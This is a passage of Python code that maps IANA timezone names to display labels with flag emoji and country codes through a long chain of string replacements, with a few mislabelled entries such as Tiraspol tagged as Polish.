            timezone = timezone.replace("America/El_Salvador", "🇸🇻El Salvador[SV]")
            timezone = timezone.replace("America/Ensenada", "🇲🇽Ensenada[MX]")
            timezone = timezone.replace("America/Fort_Nelson", "🇨🇦Fort Nelson[CA]")
            timezone = timezone.replace("America/Fort_Wayne", "🇺🇸Fort Wayne[US]")
            timezone = timezone.replace("America/Fortaleza", "🇧🇷Fortaleza[BR]")
            timezone = timezone.replace("America/Glace_Bay", "🇨🇦Glace Bay[CA]")
            timezone = timezone.replace("America/Godthab", "🇬🇱Godthåb[GL]")
            timezone = timezone.replace("America/Goose_Bay", "🇨🇦Goose Bay[CA]")
            timezone = timezone.replace("America/Grand_Turk", "🇹🇨Grand Turk[TC]")
            timezone = timezone.replace("America/Grenada", "🇬🇩Grenada[GD]")
            timezone = timezone.replace("America/Guadeloupe", "🇬🇵Guadeloupe[GP]")
            timezone = timezone.replace("America/Guatemala", "🇬🇹Guatemala[GT]")
            timezone = timezone.replace("America/Guayaquil", "🇪🇨Guayaquil[EC]")
            timezone = timezone.replace("America/Guyana", "🇬🇾Guyana[GY]")
            timezone = timezone.replace("America/Halifax", "🇨🇦Halifax[CA]")
            timezone = timezone.replace("America/Havana", "🇨🇺Havana[CU]")
            timezone = timezone.replace("America/Hermosillo", "🇲🇽Hermosillo[MX]")
            timezone = timezone.replace("America/Indiana/Indianapolis", "🇺🇸Indianapolis[US]")
            timezone = timezone.replace("America/Indiana/Knox", "🇺🇸Knox[US]")
            timezone = timezone.replace("America/Indiana/Marengo", "🇺🇸Marengo[US]")
            timezone = timezone.replace("America/Indiana/Petersburg", "🇺🇸Petersburg[US]")
            timezone = timezone.replace("America/Indiana/Tell_City", "🇺🇸Tell City[US]")
            timezone = timezone.replace("America/Indiana/Vevay", "🇺🇸Vevay[US]")
            timezone = timezone.replace("America/Indiana/Vincennes", "🇺🇸Vincennes[US]")
            timezone = timezone.replace("America/Indiana/Winamac", "🇺🇸Winamac[US]")
            timezone = timezone.replace("America/Indianapolis", "🇺🇸Indianapolis[US]")
            timezone = timezone.replace("America/Inuvik", "🇨🇦Inuvik[CA]")
            timezone = timezone.replace("America/Iqaluit", "🇨🇦Iqaluit[CA]")
            timezone = timezone.replace("America/Jamaica", "🇯🇲Jamaica[JM]")
            timezone = timezone.replace("America/Jujuy", "🇦🇷Jujuy[AR]")
            timezone = timezone.replace("America/Juneau", "🇺🇸Juneau[US]")
            timezone = timezone.replace("America/Kentucky/Louisville", "🇺🇸Louisville[US]")
            timezone = timezone.replace("America/Kentucky/Monticello", "🇺🇸Monticello[US]")
            timezone = timezone.replace("America/Knox_IN", "🇺🇸Knox[US]")
            timezone = timezone.replace("America/Kralendijk", "🇧🇶Kralendijk[BQ]")
            timezone = timezone.replace("America/La_Paz", "🇧🇴La Paz[BO]")
            timezone = timezone.replace("America/Lima", "🇵🇪Lima[PE]")
            timezone = timezone.replace("America/Los_Angeles", "🇺🇸Los Angeles[US]")
            timezone = timezone.replace("America/Louisville", "🇺🇸Louisville[US]")
            timezone = timezone.replace("America/Lower_Princes", "🇸🇽Lower Princes[SX]")
            timezone = timezone.replace("America/Maceio", "🇧🇷Maceió[BR]")
            timezone = timezone.replace("America/Managua", "🇳🇮Managua[NI]")
            timezone = timezone.replace("America/Manaus", "🇧🇷Manaus[BR]")
            timezone = timezone.replace("America/Marigot", "🇲🇫Marigot[MF]")
            timezone = timezone.replace("America/Martinique", "🇲🇶Martinique[MQ]")
            timezone = timezone.replace("America/Matamoros", "🇲🇽Matamoros[MX]")
            timezone = timezone.replace("America/Mazatlan", "🇲🇽Mazatlán[MX]")
            timezone = timezone.replace("America/Mendoza", "🇦🇷Mendoza[AR]")
            timezone = timezone.replace("America/Menominee", "🇺🇸Menominee[US]")
            timezone = timezone.replace("America/Merida", "🇲🇽Mérida[MX]")
            timezone = timezone.replace("America/Metlakatla", "🇺🇸Metlakatla[US]")
            timezone = timezone.replace("America/Mexico_City", "🇲🇽Mexico City[MX]")
            timezone = timezone.replace("America/Miquelon", "🇵🇲Miquelon[PM]")
            timezone = timezone.replace("America/Moncton", "🇨🇦Moncton[CA]")
            timezone = timezone.replace("America/Monterrey", "🇲🇽Monterrey[MX]")
            timezone = timezone.replace("America/Montevideo", "🇺🇾Montevideo[UY]")
            timezone = timezone.replace("America/Montreal", "🇨🇦Montreal[CA]")
            timezone = timezone.replace("America/Montserrat", "🇲🇸Montserrat[MS]")
            timezone = timezone.replace("America/Nassau", "🇧🇸Nassau[BS]")
            timezone = timezone.replace("America/New_York", "🇺🇸New York[US]")
            timezone = timezone.replace("America/Nipigon", "🇨🇦Nipigon[CA]")
            timezone = timezone.replace("America/Nome", "🇺🇸Nome[US]")
            timezone = timezone.replace("America/Noronha", "🇧🇷Fernando de Noronha[BR]")
            timezone = timezone.replace("America/North_Dakota/Beulah", "🇺🇸North Dakota[US]")
            timezone = timezone.replace("America/North_Dakota/Center", "🇺🇸North Dakota[US]")
            timezone = timezone.replace("America/North_Dakota/New_Salem", "🇺🇸North Dakota[US]")
            timezone = timezone.replace("America/Nuuk", "🇬🇱Nuuk[GL]")
            timezone = timezone.replace("America/Ojinaga", "🇲🇽Ojinaga[MX]")
            timezone = timezone.replace("America/Panama", "🇵🇦Panama[PA]")
            timezone = timezone.replace("America/Pangnirtung", "🇨🇦Pangnirtung[CA]")
            timezone = timezone.replace("America/Paramaribo", "🇸🇷Paramaribo[SR]")
            timezone = timezone.replace("America/Phoenix", "🇺🇸Phoenix[US]")
            timezone = timezone.replace("America/Port-au-Prince", "🇭🇹Port-au-Prince[HT]")
            timezone = timezone.replace("America/Port_of_Spain", "🇹🇹Port of Spain[TT]")
            timezone = timezone.replace("America/Porto_Acre", "🇧🇷Porto Acre[BR]")
            timezone = timezone.replace("America/Porto_Velho", "🇧🇷Porto Velho[BR]")
            timezone = timezone.replace("America/Puerto_Rico", "🇵🇷San Juan[PR]")
            timezone = timezone.replace("America/Punta_Arenas", "🇨🇱Punta Arenas[CL]")
            timezone = timezone.replace("America/Rainy_River", "🇨🇦Rainy River[CA]")
            timezone = timezone.replace("America/Rankin_Inlet", "🇨🇦Rankin Inlet[CA]")
            timezone = timezone.replace("America/Recife", "🇧🇷Recife[BR]")
            timezone = timezone.replace("America/Regina", "🇨🇦Regina[CA]")
            timezone = timezone.replace("America/Resolute", "🇨🇦Resolute[CA]")
            timezone = timezone.replace("America/Rio_Branco", "🇧🇷Rio Branco[BR]")
            timezone = timezone.replace("America/Rosario", "🇦🇷Rosario[AR]")
            timezone = timezone.replace("America/Santa_Isabel", "🇲🇽Santa Isabel[MX]")
            timezone = timezone.replace("America/Santarem", "🇧🇷Santarém[BR]")
            timezone = timezone.replace("America/Santiago", "🇨🇱Santiago[CL]")
            timezone = timezone.replace("America/Santo_Domingo", "🇩🇴Santo Domingo[DO]")
            timezone = timezone.replace("America/Sao_Paulo", "🇧🇷São Paulo[BR]")
            timezone = timezone.replace("America/Scoresbysund", "🇬🇱Scoresbysund[GL]")
            timezone = timezone.replace("America/Shiprock", "🇺🇸Shiprock[US]")
            timezone = timezone.replace("America/Sitka", "🇺🇸Sitka[US]")
            timezone = timezone.replace("America/St_Barthelemy", "🇧🇱St. Barthélemy[BL]")
            timezone = timezone.replace("America/St_Johns", "🇨🇦St. John's[CA]")
            timezone = timezone.replace("America/St_Kitts", "🇰🇳St. Kitts[KN]")
            timezone = timezone.replace("America/St_Lucia", "🇱🇨St. Lucia[LC]")
            timezone = timezone.replace("America/St_Thomas", "🇻🇮St. Thomas[VI]")
            timezone = timezone.replace("America/St_Vincent", "🇻🇨St. Vincent[VC]")
            timezone = timezone.replace("America/Swift_Current", "🇨🇦Swift Current[CA]")
            timezone = timezone.replace("America/Tegucigalpa", "🇭🇳Tegucigalpa[HN]")
            timezone = timezone.replace("America/Thule", "🇬🇱Thule[GL]")
            timezone = timezone.replace("America/Thunder_Bay", "🇨🇦Thunder Bay[CA]")
            timezone = timezone.replace("America/Tijuana", "🇲🇽Tijuana[MX]")
            timezone = timezone.replace("America/Toronto", "🇨🇦Toronto[CA]")
            timezone = timezone.replace("America/Tortola", "🇻🇬Tortola[VG]")
            timezone = timezone.replace("America/Vancouver", "🇨🇦Vancouver[CA]")
            timezone = timezone.replace("America/Virgin", "🇻🇮Virgin Islands[VI]")
            timezone = timezone.replace("America/Whitehorse", "🇨🇦Whitehorse[CA]")
            timezone = timezone.replace("America/Winnipeg", "🇨🇦Winnipeg[CA]")
            timezone = timezone.replace("America/Yakutat", "🇺🇸Yakutat[US]")
            timezone = timezone.replace("America/Yellowknife", "🇨🇦Yellowknife[CA]")
            timezone = timezone.replace("Antarctica/Casey", "🇦🇶Casey[AQ]")
            timezone = timezone.replace("Antarctica/Davis", "🇦🇶Davis[AQ]")
            timezone = timezone.replace("Antarctica/DumontDUrville", "🇦🇶Dumont d'Urville[AQ]")
            timezone = timezone.replace("Antarctica/Macquarie", "🇦🇶Macquarie Island[AQ]")
            timezone = timezone.replace("Antarctica/Mawson", "🇦🇶Mawson[AQ]")
            timezone = timezone.replace("Antarctica/McMurdo", "🇳🇿McMurdo[NZ]")
            timezone = timezone.replace("Antarctica/Palmer", "🇦🇶Palmer[AQ]")
            timezone = timezone.replace("Antarctica/Rothera", "🇦🇶Rothera[AQ]")
            timezone = timezone.replace("Antarctica/South_Pole", "🇦🇶South Pole[AQ]")
            timezone = timezone.replace("Antarctica/Syowa", "🇦🇶Syowa[AQ]")
            timezone = timezone.replace("Antarctica/Troll", "🇦🇶Troll[AQ]")
            timezone = timezone.replace("Antarctica/Vostok", "🇦🇶Vostok[AQ]")
            timezone = timezone.replace("Arctic/Longyearbyen", "🇸🇯Longyearbyen[SJ]")
            timezone = timezone.replace("Asia/Aden", "🇾🇪Aden[YE]")
            timezone = timezone.replace("Asia/Almaty", "🇰🇿Almaty[KZ]")
            timezone = timezone.replace("Asia/Amman", "🇯🇴Amman[JO]")
            timezone = timezone.replace("Asia/Anadyr", "🇷🇺Anadyr[RU]")
            timezone = timezone.replace("Asia/Aqtau", "🇰🇿Aqtau[KZ]")
            timezone = timezone.replace("Asia/Aqtobe", "🇰🇿Aqtobe[KZ]")
            timezone = timezone.replace("Asia/Ashgabat", "🇹🇲Ashgabat[TM]")
            timezone = timezone.replace("Asia/Ashkhabad", "🇹🇲Ashkhabad[TM]")
            timezone = timezone.replace("Asia/Atyrau", "🇰🇿Atyrau[KZ]")
            timezone = timezone.replace("Asia/Baghdad", "🇮🇶Baghdad[IQ]")
            timezone = timezone.replace("Asia/Bahrain", "🇧🇭Bahrain[BH]")
            timezone = timezone.replace("Asia/Baku", "🇦🇿Baku[AZ]")
            timezone = timezone.replace("Asia/Bangkok", "🇹🇭Bangkok[TH]")
            timezone = timezone.replace("Asia/Barnaul", "🇷🇺Barnaul[RU]")
            timezone = timezone.replace("Asia/Beirut", "🇱🇧Beirut[LB]")
            timezone = timezone.replace("Asia/Bishkek", "🇰🇬Bishkek[KG]")
            timezone = timezone.replace("Asia/Brunei", "🇧🇳Brunei[BN]")
            timezone = timezone.replace("Asia/Calcutta", "🇮🇳Calcutta[IN]")
            timezone = timezone.replace("Asia/Chita", "🇷🇺Chita[RU]")
            timezone = timezone.replace("Asia/Choibalsan", "🇲🇳Choibalsan[MN]")
            timezone = timezone.replace("Asia/Chongqing", "🇨🇳Chongqing[CN]")
            timezone = timezone.replace("Asia/Chungking", "🇨🇳Chungking[CN]")
            timezone = timezone.replace("Asia/Colombo", "🇱🇰Colombo[LK]")
            timezone = timezone.replace("Asia/Dacca", "🇧🇩Dacca[BD]")
            timezone = timezone.replace("Asia/Damascus", "🇸🇾Damascus[SY]")
            timezone = timezone.replace("Asia/Dhaka", "🇧🇩Dhaka[BD]")
            timezone = timezone.replace("Asia/Dili", "🇹🇱Dili[TL]")
            timezone = timezone.replace("Asia/Dubai", "🇦🇪Dubai[AE]")
            timezone = timezone.replace("Asia/Dushanbe", "🇹🇯Dushanbe[TJ]")
            timezone = timezone.replace("Asia/Famagusta", "🇨🇾Famagusta[CY]")
            timezone = timezone.replace("Asia/Gaza", "🇵🇸Gaza[PS]")
            timezone = timezone.replace("Asia/Harbin", "🇨🇳Harbin[CN]")
            timezone = timezone.replace("Asia/Hebron", "🇵🇸Hebron[PS]")
            timezone = timezone.replace("Asia/Ho_Chi_Minh", "🇻🇳Ho Chi Minh[VN]")
            timezone = timezone.replace("Asia/Hong_Kong", "🇭🇰Hong Kong[HK]")
            timezone = timezone.replace("Asia/Hovd", "🇲🇳Hovd[MN]")
            timezone = timezone.replace("Asia/Irkutsk", "🇷🇺Irkutsk[RU]")
            timezone = timezone.replace("Asia/Jakarta", "🇮🇩Jakarta[ID]")
            timezone = timezone.replace("Asia/Jayapura", "🇮🇩Jayapura[ID]")
            timezone = timezone.replace("Asia/Jerusalem", "🇮🇱Jerusalem[IL]")
            timezone = timezone.replace("Asia/Kabul", "🇦🇫Kabul[AF]")
            timezone = timezone.replace("Asia/Kamchatka", "🇷🇺Kamchatka[RU]")
            timezone = timezone.replace("Asia/Karachi", "🇵🇰Karachi[PK]")
            timezone = timezone.replace("Asia/Kashgar", "🇨🇳Kashgar[CN]")
            timezone = timezone.replace("Asia/Kathmandu", "🇳🇵Kathmandu[NP]")
            timezone = timezone.replace("Asia/Katmandu", "🇳🇵Katmandu[NP]")
            timezone = timezone.replace("Asia/Khandyga", "🇷🇺Khandyga[RU]")
            timezone = timezone.replace("Asia/Kolkata", "🇮🇳Kolkata[IN]")
            timezone = timezone.replace("Asia/Krasnoyarsk", "🇷🇺Krasnoyarsk[RU]")
            timezone = timezone.replace("Asia/Kuala_Lumpur", "🇲🇾Kuala Lumpur[MY]")
            timezone = timezone.replace("Asia/Kuching", "🇲🇾Kuching[MY]")
            timezone = timezone.replace("Asia/Kuwait", "🇰🇼Kuwait[KW]")
            timezone = timezone.replace("Asia/Macao", "🇲🇴Macao[MO]")
            timezone = timezone.replace("Asia/Macau", "🇲🇴Macau[MO]")
            timezone = timezone.replace("Asia/Magadan", "🇷🇺Magadan[RU]")
            timezone = timezone.replace("Asia/Makassar", "🇮🇩Makassar[ID]")
            timezone = timezone.replace("Asia/Manila", "🇵🇭Manila[PH]")
            timezone = timezone.replace("Asia/Muscat", "🇴🇲Muscat[OM]")
            timezone = timezone.replace("Asia/Nicosia", "🇨🇾Nicosia[CY]")
            timezone = timezone.replace("Asia/Novokuznetsk", "🇷🇺Novokuznetsk[RU]")
            timezone = timezone.replace("Asia/Novosibirsk", "🇷🇺Novosibirsk[RU]")
            timezone = timezone.replace("Asia/Omsk", "🇷🇺Omsk[RU]")
            timezone = timezone.replace("Asia/Oral", "🇰🇿Oral[KZ]")
            timezone = timezone.replace("Asia/Phnom_Penh", "🇰🇭Phnom Penh[KH]")
            timezone = timezone.replace("Asia/Pontianak", "🇮🇩Pontianak[ID]")
            timezone = timezone.replace("Asia/Pyongyang", "🇰🇵Pyongyang[KP]")
            timezone = timezone.replace("Asia/Qatar", "🇶🇦Qatar[QA]")
            timezone = timezone.replace("Asia/Qostanay", "🇰🇿Qostanay[KZ]")
            timezone = timezone.replace("Asia/Qyzylorda", "🇰🇿Qyzylorda[KZ]")
            timezone = timezone.replace("Asia/Rangoon", "🇲🇲Rangoon[MM]")
            timezone = timezone.replace("Asia/Riyadh", "🇸🇦Riyadh[SA]")
            timezone = timezone.replace("Asia/Saigon", "🇻🇳Saigon[VN]")
            timezone = timezone.replace("Asia/Sakhalin", "🇷🇺Sakhalin[RU]")
            timezone = timezone.replace("Asia/Samarkand", "🇺🇿Samarkand[UZ]")
            timezone = timezone.replace("Asia/Seoul", "🇰🇷Seoul[KR]")
            timezone = timezone.replace("Asia/Shanghai", "🇨🇳Shanghai[CN]")
            timezone = timezone.replace("Asia/Singapore", "🇸🇬Singapore[SG]")
            timezone = timezone.replace("Asia/Srednekolymsk", "🇷🇺Srednekolymsk[RU]")
            timezone = timezone.replace("Asia/Taipei", "🇹🇼Taipei[TW]")
            timezone = timezone.replace("Asia/Tashkent", "🇺🇿Tashkent[UZ]")
            timezone = timezone.replace("Asia/Tbilisi", "🇬🇪Tbilisi[GE]")
            timezone = timezone.replace("Asia/Tehran", "🇮🇷Tehran[IR]")
            timezone = timezone.replace("Asia/Tel_Aviv", "🇮🇱Tel Aviv[IL]")
            timezone = timezone.replace("Asia/Thimbu", "🇧🇹Thimbu[BT]")
            timezone = timezone.replace("Asia/Thimphu", "🇧🇹Thimphu[BT]")
            timezone = timezone.replace("Asia/Tokyo", "🇯🇵Tokyo[JP]")
            timezone = timezone.replace("Asia/Tomsk", "🇷🇺Tomsk[RU]")
            timezone = timezone.replace("Asia/Ujung_Pandang", "🇮🇩Ujung Pandang[ID]")
            timezone = timezone.replace("Asia/Ulaanbaatar", "🇲🇳Ulaanbaatar[MN]")
            timezone = timezone.replace("Asia/Ulan_Bator", "🇲🇳Ulan Bator[MN]")
            timezone = timezone.replace("Asia/Urumqi", "🇨🇳Urumqi[CN]")
            timezone = timezone.replace("Asia/Ust-Nera", "🇷🇺Ust-Nera[RU]")
            timezone = timezone.replace("Asia/Vientiane", "🇱🇦Vientiane[LA]")
            timezone = timezone.replace("Asia/Vladivostok", "🇷🇺Vladivostok[RU]")
            timezone = timezone.replace("Asia/Yakutsk", "🇷🇺Yakutsk[RU]")
            timezone = timezone.replace("Asia/Yangon", "🇲🇲Yangon[MM]")
            timezone = timezone.replace("Asia/Yekaterinburg", "🇷🇺Yekaterinburg[RU]")
            timezone = timezone.replace("Asia/Yerevan", "🇦🇲Yerevan[AM]")
            timezone = timezone.replace("Atlantic/Azores", "🇵🇹Azores[PT]")
            timezone = timezone.replace("Atlantic/Bermuda", "🇧🇲Bermuda[BM]")
            timezone = timezone.replace("Atlantic/Canary", "🇪🇸Canary[ES]")
            timezone = timezone.replace("Atlantic/Cape_Verde", "🇨🇻Cape Verde[CV]")
            timezone = timezone.replace("Atlantic/Faeroe", "🇫🇴Faroe Islands[FO]")
            timezone = timezone.replace("Atlantic/Faroe", "🇫🇴Faroe Islands[FO]")
            timezone = timezone.replace("Atlantic/Jan_Mayen", "🇳🇴Jan Mayen[NO]")
            timezone = timezone.replace("Atlantic/Madeira", "🇵🇹Madeira[PT]")
            timezone = timezone.replace("Atlantic/Reykjavik", "🇮🇸Reykjavik[IS]")
            timezone = timezone.replace("Atlantic/South_Georgia", "🇬🇸South Georgia[GS]")
            timezone = timezone.replace("Atlantic/St_Helena", "🇸🇭St. Helena[SH]")
            timezone = timezone.replace("Atlantic/Stanley", "🇫🇰Stanley[FK]")
            timezone = timezone.replace("Australia/ACT", "🇦🇺Australian Capital Territory[AU]")
            timezone = timezone.replace("Australia/Adelaide", "🇦🇺Adelaide[AU]")
            timezone = timezone.replace("Australia/Brisbane", "🇦🇺Brisbane[AU]")
            timezone = timezone.replace("Australia/Broken_Hill", "🇦🇺Broken Hill[AU]")
            timezone = timezone.replace("Australia/Canberra", "🇦🇺Canberra[AU]")
            timezone = timezone.replace("Australia/Currie", "🇦🇺Currie[AU]")
            timezone = timezone.replace("Australia/Darwin", "🇦🇺Darwin[AU]")
            timezone = timezone.replace("Australia/Eucla", "🇦🇺Eucla[AU]")
            timezone = timezone.replace("Australia/Hobart", "🇦🇺Hobart[AU]")
            timezone = timezone.replace("Australia/LHI", "🇦🇺Lord Howe Island[AU]")
            timezone = timezone.replace("Australia/Lindeman", "🇦🇺Lindeman[AU]")
            timezone = timezone.replace("Australia/Lord_Howe", "🇦🇺Lord Howe Island[AU]")
            timezone = timezone.replace("Australia/Melbourne", "🇦🇺Melbourne[AU]")
            timezone = timezone.replace("Australia/NSW", "🇦🇺New South Wales[AU]")
            timezone = timezone.replace("Australia/North", "🇦🇺North[AU]")
            timezone = timezone.replace("Australia/Perth", "🇦🇺Perth[AU]")
            timezone = timezone.replace("Australia/Queensland", "🇦🇺Queensland[AU]")
            timezone = timezone.replace("Australia/South", "🇦🇺South[AU]")
            timezone = timezone.replace("Australia/Sydney", "🇦🇺Sydney[AU]")
            timezone = timezone.replace("Australia/Tasmania", "🇦🇺Tasmania[AU]")
            timezone = timezone.replace("Australia/Victoria", "🇦🇺Victoria[AU]")
            timezone = timezone.replace("Australia/West", "🇦🇺West[AU]")
            timezone = timezone.replace("Australia/Yancowinna", "🇦🇺Yancowinna[AU]")
            timezone = timezone.replace("Brazil/Acre", "🇧🇷Acre[BR]")
            timezone = timezone.replace("Brazil/DeNoronha", "🇧🇷Fernando de Noronha[BR]")
            timezone = timezone.replace("Brazil/East", "🇧🇷Brasília[BR]")
            timezone = timezone.replace("Brazil/West", "🇧🇷Amazon[BR]")
            timezone = timezone.replace("Canada/Atlantic", "🇨🇦Atlantic[CA]")
            timezone = timezone.replace("Canada/Central", "🇨🇦Central[CA]")
            timezone = timezone.replace("Canada/Eastern", "🇨🇦Eastern[CA]")
            timezone = timezone.replace("Canada/Mountain", "🇨🇦Mountain[CA]")
            timezone = timezone.replace("Canada/Newfoundland", "🇨🇦Newfoundland[CA]")
            timezone = timezone.replace("Canada/Pacific", "🇨🇦Pacific[CA]")
            timezone = timezone.replace("Canada/Saskatchewan", "🇨🇦Saskatchewan[CA]")
            timezone = timezone.replace("Canada/Yukon", "🇨🇦Yukon[CA]")
            timezone = timezone.replace("Chile/Continental", "🇨🇱Continental Chile[CL]")
            timezone = timezone.replace("Chile/EasterIsland", "🇨🇱Easter Island[CL]")
            timezone = timezone.replace("Cuba", "🇨🇺Cuba[CU]")
            timezone = timezone.replace("Egypt", "🇪🇬Egypt[EG]")
            timezone = timezone.replace("Eire", "🇮🇪Ireland[IE]")
            timezone = timezone.replace("Etc/Greenwich", "🌐Greenwich")
            timezone = timezone.replace("Etc/UCT", "🌐UCT")
            timezone = timezone.replace("Etc/UTC", "🌐UTC")
            timezone = timezone.replace("Etc/Universal", "🌐Universal")
            timezone = timezone.replace("Europe/Amsterdam", "🇳🇱Amsterdam[NL]")
            timezone = timezone.replace("Europe/Andorra", "🇦🇩Andorra[AD]")
            timezone = timezone.replace("Europe/Astrakhan", "🇷🇺Astrakhan[RU]")
            timezone = timezone.replace("Europe/Athens", "🇬🇷Athens[GR]")
            timezone = timezone.replace("Europe/Belfast", "🇬🇧Belfast[GB]")
            timezone = timezone.replace("Europe/Belgrade", "🇷🇸Belgrade[RS]")
            timezone = timezone.replace("Europe/Berlin", "🇩🇪Berlin[DE]")
            timezone = timezone.replace("Europe/Bratislava", "🇸🇰Bratislava[SK]")
            timezone = timezone.replace("Europe/Brussels", "🇧🇪Brussels[BE]")
            timezone = timezone.replace("Europe/Bucharest", "🇷🇴Bucharest[RO]")
            timezone = timezone.replace("Europe/Budapest", "🇭🇺Budapest[HU]")
            timezone = timezone.replace("Europe/Busingen", "🇩🇪Busingen[DE]")
            timezone = timezone.replace("Europe/Chisinau", "🇲🇩Chisinau[MD]")
            timezone = timezone.replace("Europe/Copenhagen", "🇩🇰Copenhagen[DK]")
            timezone = timezone.replace("Europe/Dublin", "🇮🇪Dublin[IE]")
            timezone = timezone.replace("Europe/Gibraltar", "🇬🇮Gibraltar[GI]")
            timezone = timezone.replace("Europe/Guernsey", "🇬🇬Guernsey[GG]")
            timezone = timezone.replace("Europe/Helsinki", "🇫🇮Helsinki[FI]")
            timezone = timezone.replace("Europe/Isle_of_Man", "🇮🇲Isle of Man[IM]")
            timezone = timezone.replace("Europe/Istanbul", "🇹🇷Istanbul[TR]")
            timezone = timezone.replace("Europe/Jersey", "🇯🇪Jersey[JE]")
            timezone = timezone.replace("Europe/Kaliningrad", "🇷🇺Kaliningrad[RU]")
            timezone = timezone.replace("Europe/Kiev", "🇺🇦Kiev[UA]")
            timezone = timezone.replace("Europe/Kirov", "🇷🇺Kirov[RU]")
            timezone = timezone.replace("Europe/Kyiv", "🇺🇦Kyiv[UA]")
            timezone = timezone.replace("Europe/Lisbon", "🇵🇹Lisbon[PT]")
            timezone = timezone.replace("Europe/Ljubljana", "🇸🇮Ljubljana[SI]")
            timezone = timezone.replace("Europe/London", "🇬🇧London[GB]")
            timezone = timezone.replace("Europe/Luxembourg", "🇱🇺Luxembourg[LU]")
            timezone = timezone.replace("Europe/Madrid", "🇪🇸Madrid[ES]")
            timezone = timezone.replace("Europe/Malta", "🇲🇹Malta[MT]")
            timezone = timezone.replace("Europe/Mariehamn", "🇦🇽Mariehamn[AX]")
            timezone = timezone.replace("Europe/Minsk", "🇧🇾Minsk[BY]")
            timezone = timezone.replace("Europe/Monaco", "🇲🇨Monaco[MC]")
            timezone = timezone.replace("Europe/Moscow", "🇷🇺Moscow[RU]")
            timezone = timezone.replace("Europe/Nicosia", "🇨🇾Nicosia[CY]")
            timezone = timezone.replace("Europe/Oslo", "🇳🇴Oslo[NO]")
            timezone = timezone.replace("Europe/Paris", "🇫🇷Paris[FR]")
            timezone = timezone.replace("Europe/Podgorica", "🇲🇪Podgorica[ME]")
            timezone = timezone.replace("Europe/Prague", "🇨🇿Prague[CZ]")
            timezone = timezone.replace("Europe/Riga", "🇱🇻Riga[LV]")
            timezone = timezone.replace("Europe/Rome", "🇮🇹Rome[IT]")
            timezone = timezone.replace("Europe/Samara", "🇷🇺Samara[RU]")
            timezone = timezone.replace("Europe/San_Marino", "🇸🇲San Marino[SM]")
            timezone = timezone.replace("Europe/Sarajevo", "🇧🇦Sarajevo[BA]")
            timezone = timezone.replace("Europe/Saratov", "🇷🇺Saratov[RU]")
            timezone = timezone.replace("Europe/Simferopol", "🇺🇦Simferopol[UA]")
            timezone = timezone.replace("Europe/Skopje", "🇲🇰Skopje[MK]")
            timezone = timezone.replace("Europe/Sofia", "🇧🇬Sofia[BG]")
            timezone = timezone.replace("Europe/Stockholm", "🇸🇪Stockholm[SE]")
            timezone = timezone.replace("Europe/Tallinn", "🇪🇪Tallinn[EE]")
            timezone = timezone.replace("Europe/Tirane", "🇦🇱Tirane[AL]")
            timezone = timezone.replace("Europe/Tiraspol", "🇵🇱Tiraspol[PL]")
            timezone = timezone.replace("Europe/Ulyanovsk", "🇷🇺Ulyanovsk[RU]")
            timezone = timezone.replace("Europe/Uzhgorod", "🇺🇦Uzhgorod[UA]")
            timezone = timezone.replace("Europe/Vaduz", "🇱🇮Vaduz[LI]")
            timezone = timezone.replace("Europe/Vatican", "🇻🇦Vatican City[VA]")
            timezone = timezone.replace("Europe/Vienna", "🇦🇹Vienna[AT]")
            timezone = timezone.replace("Europe/Vilnius", "🇱🇹Vilnius[LT]")
            timezone = timezone.replace("Europe/Volgograd", "🇷🇺Volgograd[RU]")
            timezone = timezone.replace("Europe/Warsaw", "🇵🇱Warsaw[PL]")
            timezone = timezone.replace("Europe/Zagreb", "🇭🇷Zagreb[HR]")
            timezone = timezone.replace("Europe/Zaporozhye", "🇺🇦Zaporozhye[UA]")
            timezone = timezone.replace("Europe/Zurich", "🇨🇭Zurich[CH]")
            timezone = timezone.replace("Iceland", "🇮🇸Iceland[IS]")
            timezone = timezone.replace("Indian/Antananarivo", "🇲🇬Antananarivo[MG]")
            timezone = timezone.replace("Indian/Chagos", "🇮🇴Chagos[IO]")
            timezone = timezone.replace("Indian/Christmas", "🇨🇽Christmas[CC]")
            timezone = timezone.replace("Indian/Cocos", "🇨🇨Cocos[CC]")
            timezone = timezone.replace("Indian/Comoro", "🇰🇲Comoro[KM]")
            timezone = timezone.replace("Indian/Kerguelen", "🇹🇫Kerguelen[TF]")
            timezone = timezone.replace("Indian/Mahe", "🇸🇨Mahe[SC]")
            timezone = timezone.replace("Indian/Maldives", "🇲🇻Maldives[MV]")
            timezone = timezone.replace("Indian/Mauritius", "🇲🇺Mauritius[MU]")
            timezone = timezone.replace("Indian/Mayotte", "🇾🇹Mayotte[YT]")
            timezone = timezone.replace("Indian/Reunion", "🇷🇪Reunion[RE]")
            timezone = timezone.replace("Kwajalein", "🇲🇭Kwajalein[MH]")
            timezone = timezone.replace("Mexico/BajaNorte", "🇲🇽Baja Norte[MX]")
            timezone = timezone.replace("Mexico/BajaSur", "🇲🇽Baja Sur[MX]")
            timezone = timezone.replace("Mexico/General", "🇲🇽General[MX]")
            timezone = timezone.replace("NZ", "🇳🇿New Zealand[NZ]")
            timezone = timezone.replace("NZ-CHAT", "🇳🇿Chatham Islands[NZ]")
            timezone = timezone.replace("Navajo", "Navajo")
            timezone = timezone.replace("Pacific/Apia", "🇼🇸Apia[WS]")
            timezone = timezone.replace("Pacific/Auckland", "🇳🇿Auckland[NZ]")
            timezone = timezone.replace("Pacific/Bougainville", "🇵🇬Bougainville[PG]")
            timezone = timezone.replace("Pacific/Chatham", "🇳🇿Chatham[NZ]")
            timezone = timezone.replace("Pacific/Chuuk", "🇫🇲Chuuk[FM]")
            timezone = timezone.replace("Pacific/Easter", "🇨🇱Easter Island[CL]")
            timezone = timezone.replace("Pacific/Efate", "🇻🇺Efate[VU]")
            timezone = timezone.replace("Pacific/Enderbury", "🇰🇮Enderbury[KI]")
            timezone = timezone.replace("Pacific/Fakaofo", "🇹🇰Fakaofo[TK]")
            timezone = timezone.replace("Pacific/Fiji", "🇫🇯Fiji[FJ]")
            timezone = timezone.replace("Pacific/Funafuti", "🇹🇻Funafuti[TV]")
            timezone = timezone.replace("Pacific/Galapagos", "🇪🇨Galapagos[EC]")
            timezone = timezone.replace("Pacific/Gambier", "🇵🇫Gambier Islands[PF]")
            timezone = timezone.replace("Pacific/Guadalcanal", "🇸🇧Guadalcanal[SB]")
            timezone = timezone.replace("Pacific/Guam", "🇬🇺Guam[GU]")
            timezone = timezone.replace("Pacific/Honolulu", "🇺🇸Honolulu[US]")
            timezone = timezone.replace("Pacific/Johnston", "🇺🇸Johnston[US]")
            timezone = timezone.replace("Pacific/Kanton", "🇰🇮Kanton[KI]")
